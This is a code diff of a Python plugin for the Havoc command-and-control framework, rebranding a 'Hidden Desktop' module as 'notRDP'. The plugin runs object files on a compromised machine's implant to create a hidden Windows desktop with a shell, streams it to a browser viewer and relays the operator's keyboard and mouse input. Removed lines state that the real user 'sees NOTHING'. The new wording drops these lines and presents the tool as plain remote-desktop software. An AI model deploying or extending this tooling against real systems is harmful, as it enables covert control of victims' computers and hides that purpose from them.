@@ -1,17 +1,7 @@
 """
-Havoc Hidden Desktop - Invisible Desktop Plugin for Havoc C2
+notRDP - Hidden Desktop Plugin for Havoc C2
 
-Creates a hidden Windows desktop with full GUI (taskbar, start menu, icons),
-completely invisible to the real user. Streams it to a browser viewer with
-full mouse/keyboard interaction. Replicates MDSec Nighthawk's Hidden Desktop.
-
-Commands:
-  hdesktop [port] [quality]   Create hidden desktop + start streaming
-  hdesktop-close              Close hidden desktop, kill processes, stop viewer
-
-Load via Havoc Client: Scripts > Load Script > hdesktop.py
-
-Author:  Dhanush Gowda
+Author:  Dhanush Arvind
 License: For authorized security testing and educational use only.
 """
 
@@ -31,11 +21,11 @@ import webbrowser
 
 
 __version__ = "1.0.0"
-__author__ = "Dhanush Gowda"
+__author__ = "Dhanush Arvind"
 
 DEFAULT_VIEWER_PORT = 4444
 DEFAULT_JPEG_QUALITY = 30
-DEFAULT_DESKTOP_NAME = "HavocHD"
+DEFAULT_DESKTOP_NAME = "NotRDP"
 
 _bof_dir = None
 
@@ -51,7 +41,7 @@ def _get_bof_dir():
 
 
 def set_bof_dir(path):
-    """Call set_bof_dir('/path/to/hdesktop') if auto-detection picks
+    """Call set_bof_dir('/path/to/notrdp') if auto-detection picks
     the wrong directory (e.g. Havoc CWD differs from script location)."""
     global _bof_dir
     _bof_dir = path
@@ -103,8 +93,8 @@ def _get_screeninput_bof(arch):
     name = "screeninput.x86.o" if arch == "x86" else "screeninput.x64.o"
     return os.path.join(_get_bof_dir(), name)
 
-def _get_hdesktop_bof(arch):
-    name = "hdesktop_mgr.x86.o" if arch == "x86" else "hdesktop_mgr.x64.o"
+def _get_notrdp_bof(arch):
+    name = "notrdp_mgr.x86.o" if arch == "x86" else "notrdp_mgr.x64.o"
     return os.path.join(_get_bof_dir(), name)
 
 
@@ -112,7 +102,7 @@ def _init_shared_dir():
     global _shared_dir
     if _shared_dir is not None:
         return
-    _shared_dir = os.path.join(tempfile.gettempdir(), "havoc-hdesktop")
+    _shared_dir = os.path.join(tempfile.gettempdir(), "notrdp")
     os.makedirs(_shared_dir, exist_ok=True)
 
 def _write_frame(demon_id, jpeg_bytes):
@@ -154,9 +144,9 @@ def _read_and_clear_input(demon_id):
     except (FileNotFoundError, json.JSONDecodeError):
         return []
 
-def _read_and_clear_hdesktop_commands(demon_id):
+def _read_and_clear_notrdp_commands(demon_id):
     _init_shared_dir()
-    hd_file = os.path.join(_shared_dir, demon_id + "_hdesktop.json")
+    hd_file = os.path.join(_shared_dir, demon_id + "_notrdp.json")
     try:
         with open(hd_file, "r") as f:
             commands = json.load(f)
@@ -228,27 +218,27 @@ def _input_callback(demonID, TaskID, worked, output, error):
     return True
 
 
-def _hdesktop_callback(demonID, TaskID, worked, output, error):
-    _debug_log("hdesktop_cb: worked=%s output=%s error=%s" % (
+def _notrdp_callback(demonID, TaskID, worked, output, error):
+    _debug_log("notrdp_cb: worked=%s output=%s error=%s" % (
         worked, str(output)[:200] if output else "None",
         str(error)[:100] if error else "None"))
     try:
         demon = Demon(demonID)
         if error:
             demon.ConsoleWrite(demon.CONSOLE_ERROR,
-                "HDesktop BOF error: %s" % str(error)[:200])
+                "notRDP BOF error: %s" % str(error)[:200])
         if worked and output:
             demon.ConsoleWrite(demon.CONSOLE_TASK,
-                "HDesktop: %s" % output.strip()[:300])
-            if "HDESKTOP:CREATED:" in output:
-                after = output.split("HDESKTOP:CREATED:")[1]
-                name = after.split("HDESKTOP:")[0].strip()
+                "notRDP: %s" % output.strip()[:300])
+            if "NOTRDP:CREATED:" in output:
+                after = output.split("NOTRDP:CREATED:")[1]
+                name = after.split("NOTRDP:")[0].strip()
                 if not name:
                     name = DEFAULT_DESKTOP_NAME
                 _debug_log("parsed desktop name: '%s'" % name)
                 _hidden_desktop[demonID] = {"name": name, "active": True}
                 _update_demons_list()
-            elif "HDESKTOP:CLOSED:" in output:
+            elif "NOTRDP:CLOSED:" in output:
                 _hidden_desktop.pop(demonID, None)
                 _update_demons_list()
     except Exception:
@@ -274,14 +264,14 @@ def _process_pending_input(demon_id):
     }
     action_map_kbd = {"press": 0, "down": 1, "up": 2}
 
-    hdesktop_commands = [c for c in commands if c.get("input_type") == "hdesktop"]
-    hdesktop_commands += _read_and_clear_hdesktop_commands(demon_id)
-    input_commands = [c for c in commands if c.get("input_type") != "hdesktop"]
+    notrdp_commands = [c for c in commands if c.get("input_type") == "notrdp"]
+    notrdp_commands += _read_and_clear_notrdp_commands(demon_id)
+    input_commands = [c for c in commands if c.get("input_type") != "notrdp"]
 
-    for cmd in hdesktop_commands:
+    for cmd in notrdp_commands:
         try:
-            hdesktop_bof = _get_hdesktop_bof(arch)
-            if not os.path.exists(hdesktop_bof):
+            notrdp_bof = _get_notrdp_bof(arch)
+            if not os.path.exists(notrdp_bof):
                 continue
             hd_action = cmd.get("action", "run")
             packer = Packer()
@@ -301,7 +291,7 @@ def _process_pending_input(demon_id):
                 packer.addstr("")
             demon = Demon(demon_id)
             demon.InlineExecuteGetOutput(
-                _hdesktop_callback, "go", hdesktop_bof, packer.getbuffer(),
+                _notrdp_callback, "go", notrdp_bof, packer.getbuffer(),
             )
         except Exception:
             pass
@@ -370,6 +360,10 @@ def _start_viewer_server(port=None):
     shutil.copy2(server_script, _shared_dir)
     shutil.copy2(viewer_html, _shared_dir)
 
+    logo_src = os.path.join(_get_bof_dir(), "notRDP logo@2x.png")
+    if os.path.exists(logo_src):
+        shutil.copy2(logo_src, os.path.join(_shared_dir, "bg.png"))
+
     server_path = os.path.join(_shared_dir, "_viewer_server.py")
     viewer_path = os.path.join(_shared_dir, "viewer.html")
 
@@ -414,8 +408,8 @@ def _stop_viewer_server():
         pass
 
 
-def _hdesktop_created_callback(demonID, TaskID, worked, output, error):
-    _hdesktop_callback(demonID, TaskID, worked, output, error)
+def _notrdp_created_callback(demonID, TaskID, worked, output, error):
+    _notrdp_callback(demonID, TaskID, worked, output, error)
 
     hd = _hidden_desktop.get(demonID)
     if not hd:
@@ -450,18 +444,18 @@ def _hdesktop_created_callback(demonID, TaskID, worked, output, error):
     return True
 
 
-def on_hdesktop(demonID, *args):
+def on_notrdp(demonID, *args):
     demon = Demon(demonID)
     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
-        "Starting hidden desktop session...")
+        "Starting notRDP session...")
 
     arch = getattr(demon, "ProcessArch", "x64")
-    hdesktop_bof = _get_hdesktop_bof(arch)
+    notrdp_bof = _get_notrdp_bof(arch)
     screenshot_bof = _get_screenshot_bof(arch)
 
-    if not os.path.exists(hdesktop_bof):
+    if not os.path.exists(notrdp_bof):
         demon.ConsoleWrite(demon.CONSOLE_ERROR,
-            "BOF not found: %s" % os.path.basename(hdesktop_bof))
+            "BOF not found: %s" % os.path.basename(notrdp_bof))
         return TaskID
     if not os.path.exists(screenshot_bof):
         demon.ConsoleWrite(demon.CONSOLE_ERROR,
@@ -470,7 +464,7 @@ def on_hdesktop(demonID, *args):
 
     if demonID in _streaming and _streaming[demonID].get("active"):
         demon.ConsoleWrite(demon.CONSOLE_ERROR,
-            "Already running. Use hdesktop-close first.")
+            "Already running. Use notrdp-close first.")
         return TaskID
 
     port = DEFAULT_VIEWER_PORT
@@ -512,16 +506,15 @@ def on_hdesktop(demonID, *args):
     packer.addstr("")
 
     demon.InlineExecuteGetOutput(
-        _hdesktop_created_callback, "go", hdesktop_bof, packer.getbuffer(),
+        _notrdp_created_callback, "go", notrdp_bof, packer.getbuffer(),
     )
 
     viewer_url = "http://127.0.0.1:%d" % _viewer_port
     demon.ConsoleWrite(demon.CONSOLE_TASK,
-        "Hidden desktop session starting (%s, quality=%d)\n"
+        "notRDP session starting (%s, quality=%d)\n"
         "    Desktop:  %s\n"
         "    Viewer:   %s\n"
-        "    Close:    hdesktop-close\n"
-        "    User sees NOTHING - all interaction is invisible"
+        "    Close:    notrdp-close"
         % (arch, quality, desktop_name, viewer_url))
 
     try:
@@ -532,10 +525,10 @@ def on_hdesktop(demonID, *args):
     return TaskID
 
 
-def on_hdesktop_close(demonID, *args):
+def on_notrdp_close(demonID, *args):
     demon = Demon(demonID)
     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
-        "Closing hidden desktop session...")
+        "Closing notRDP session...")
 
     config = _streaming.get(demonID)
     if config and config.get("active"):
@@ -544,11 +537,11 @@ def on_hdesktop_close(demonID, *args):
         _stop_viewer_server()
 
     arch = getattr(demon, "ProcessArch", "x64")
-    hdesktop_bof = _get_hdesktop_bof(arch)
+    notrdp_bof = _get_notrdp_bof(arch)
 
-    if not os.path.exists(hdesktop_bof):
+    if not os.path.exists(notrdp_bof):
         demon.ConsoleWrite(demon.CONSOLE_ERROR,
-            "BOF not found: %s" % os.path.basename(hdesktop_bof))
+            "BOF not found: %s" % os.path.basename(notrdp_bof))
         return TaskID
 
     _demon_arch[demonID] = arch
@@ -561,41 +554,36 @@ def on_hdesktop_close(demonID, *args):
     packer.addstr("")
 
     demon.InlineExecuteGetOutput(
-        _hdesktop_callback, "go", hdesktop_bof, packer.getbuffer(),
+        _notrdp_callback, "go", notrdp_bof, packer.getbuffer(),
     )
 
     demon.ConsoleWrite(demon.CONSOLE_TASK,
-        "Closing hidden desktop '%s' (terminating all processes)"
-        % desktop_name)
+        "Closing notRDP desktop '%s'" % desktop_name)
 
     return TaskID
 
 
 RegisterCommand(
-    on_hdesktop, "", "hdesktop",
-    "Start a hidden desktop session - full GUI invisible to the user. "
-    "Creates desktop, launches shell, streams to viewer. Interact via browser.",
-    0, "[port] [quality]", "hdesktop 4444 50",
+    on_notrdp, "", "notrdp",
+    "Start a notRDP hidden desktop session",
+    0, "[port] [quality]", "notrdp 4444 50",
 )
 
 RegisterCommand(
-    on_hdesktop_close, "", "hdesktop-close",
-    "Close the hidden desktop session - stops streaming, kills all processes, "
-    "destroys desktop, shuts down viewer.",
+    on_notrdp_close, "", "notrdp-close",
+    "Close the notRDP session",
     0, "", "",
 )
 
 try:
     import havocui
     havocui.messagebox(
-        "Hidden Desktop Plugin v%s" % __version__,
+        "notRDP v%s" % __version__,
         "Author: %s\n\n"
         "Commands:\n"
-        "  hdesktop [port] [quality]  - Hidden desktop (user sees NOTHING)\n"
-        "  hdesktop-close             - Close hidden desktop + stop viewer\n\n"
-        "Creates a full desktop with shell (taskbar, start menu), streams it,\n"
-        "and opens the viewer. One command, full GUI, completely invisible.\n\n"
-        "Interact via browser: click, type, right-click - all invisible to user."
+        "  notrdp [port] [quality]  - Start hidden desktop session\n"
+        "  notrdp-close             - Close session\n\n"
+        "Viewer opens at http://127.0.0.1:4444"
         % (__author__,),
     )
 except Exception:
